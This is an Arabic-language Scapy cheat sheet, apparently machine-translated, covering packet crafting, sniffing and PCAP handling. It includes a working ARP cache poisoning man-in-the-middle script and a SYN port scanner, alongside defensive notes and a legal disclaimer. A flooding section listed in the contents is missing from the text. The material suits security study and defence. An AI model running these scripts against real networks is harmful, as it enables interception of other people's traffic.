<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="هجمات الشبكة">
</ص>

<p align="center">
  <b>🐍 أداة ومكتبة معالجة الحزم التفاعلية المبنية على لغة Python القادرة على تزوير حزم الشبكة العشوائية وإرسالها واستنشاقها وتشريحها وتشويشها</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة ونموذج طبقة التراص (`/`)](#-نظرة عامة--نموذج-طبقة التراص-)
- [التثبيت](#-التثبيت)
- [بدء الصدفة التفاعلية](#-بدء الصدفة التفاعلية)
- [صياغة حزم الشبكة](#-صياغة-حزم الشبكة)
  - [مصافحات IP وTCP](#ip-and-tcp-handshakes)
  - [ICMP Ping & Traceroute](#icmp-ping--traceroute)
  - [استعلامات DNS والحل](#dns-queries--resolution)
- [إرسال واستقبال الحزم](#-إرسال--استقبال-الحزم)
  - [الطبقة 3: `send()`، `sr()`، `sr1()`](#layer-3-send-sr-sr1)
  - [الطبقة 2: `sendp()`، `srp()`، `srp1()`](#layer-2-sendp-srp-srp1)
- [استنشاق الحزم ومعالجة PCAP](#-استنشاق الحزم--معالجة PCAP)
  - [التقاط الحزم الحية (`sniff()`)](#capturing-live-packets-sniff)
  - [قراءة وكتابة ملفات PCAP](#reading--writing-pcap-files)
- [هجمات الشبكة الهجومية](#-هجمات-الشبكة الهجومية)
  - [تسمم ذاكرة التخزين المؤقت لـ ARP (MITM)](#arp-cache-poisoning-mitm)
  - [البرنامج النصي لمسح منفذ SYN](#syn-port-scanning-script)
  - [TCP SYN / ICMP Flooding](#tcp-syn--icmp-flooding)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والكشف](#-الاعتبارات الدفاعية--الكشف)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة ونموذج طبقة التراص (`/`)

تم إنشاء **Scapy** بواسطة **Philippe Biondi**، وهو يحل محل العشرات من أدوات الشبكة ذات الغرض الواحد (ping، وtraceroute، وarpspoof، وnmap stubs).

تكمن عبقرية Scapy في استخدام عامل تقسيم Python (`/`) لتكديس طبقات البروتوكول معًا:
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
يحتوي كل حقل طبقة على قيم افتراضية معقولة يحسبها Scapy تلقائيًا (المجموع الاختباري، والأطوال، وعناوين MAC، وIP المصدر).

---

## 📥 التثبيت
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 بدء الصدفة التفاعلية

قم بتشغيل غلاف REPL التفاعلي (يتطلب امتيازات الجذر لإنشاء مآخذ توصيل أولية):
```bash
sudo scapy
```
فحص البروتوكولات والوظائف المتاحة داخل Scapy:
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ صياغة حزم الشبكة

### مصافحات IP وTCP
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### ICMP Ping & Traceroute
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### استعلامات DNS وحلها
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 إرسال واستقبال الحزم

Scapy يفصل الإرسال عن طريق طبقة OSI:

### الطبقة 3: `send()`، `sr()`، `sr1()`
تعمل مع رؤوس Ethernet المخصصة لـ kernel (تبدأ عند طبقة IP):
- `send(pkt)`: ينقل الحزمة في الطبقة 3؛ لا ينتظر الرد.
- `sr(pkt)`: يرسل الحزم ويعيد الأزواج المجابة والتي لم يتم الرد عليها `(ans, unans)`.
- `sr1(pkt)`: يرسل الحزمة ويعيد حزمة الاستجابة الأولى فقط.

### الطبقة الثانية: `sendp()`، `srp()`، `srp1()`
تأطير إيثرنت/ارتباط البيانات المخصص (يبدأ عند `Ether()`):
- `sendp(Ether() / IP(...), iface="eth0")`: إرسال إطار إيثرنت خام.
- `srp(Ether() / ARP(...))`: أرسل طلب ARP واستقبل الرد.

---

## 🔍 التعرف على الحزم والتعامل مع PCAP

### التقاط الحزم المباشرة (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### قراءة وكتابة ملفات PCAP
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ هجمات الشبكة الهجومية

### تسمم ذاكرة التخزين المؤقت لـ ARP (MITM)
جداول ARP محاكاة ساخرة لاعتراض حركة المرور بين الضحية والبوابة:
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### البرنامج النصي لمسح منفذ SYN
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ جدول مرجعي سريع

| الهدف | أمر سكابي |
|-----------|---------------|
| **بدء تشغيل Shell التفاعلي** | `sudo scapy` |
| **فحص حقول البروتوكول** | `ls(IP)` أو `ls(TCP)` |
| **إرسال حزمة L3** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **إرسال واستقبال الرد الأول**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **إرسال إطار L2 Ethernet** | `sendp(Ether()/IP(...), iface="eth0")` |
| **الشم باستخدام مرشح BPF** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **حفظ في PCAP** | `wrpcap("out.pcap", pkts)` |
| **اقرأ من PCAP** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ الاعتبارات الدفاعية والكشوفات

1. **فحص ARP الديناميكي (DAI):** قم بتكوين محولات المؤسسة باستخدام DAI وDHCP Snooping لإسقاط ردود ARP المجانية المزيفة.
2. **قواعد IDS/Suricata:** تقوم عمليات مسح SYN السريعة نصف المفتوحة ومجموعات إشارات TCP المشوهة (Xmas، NULL) التي تم إنشاؤها بواسطة Scapy بتشغيل تنبيهات IDS القياسية.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> يمكن لـ Scapy إنشاء حزم مشوهة تتسبب في ظروف رفض الخدمة أو تعترض البيانات الخاصة. ويجب استخدامه بشكل صارم في التقييمات الأمنية المعتمدة وشبكات الاختبار المعزولة.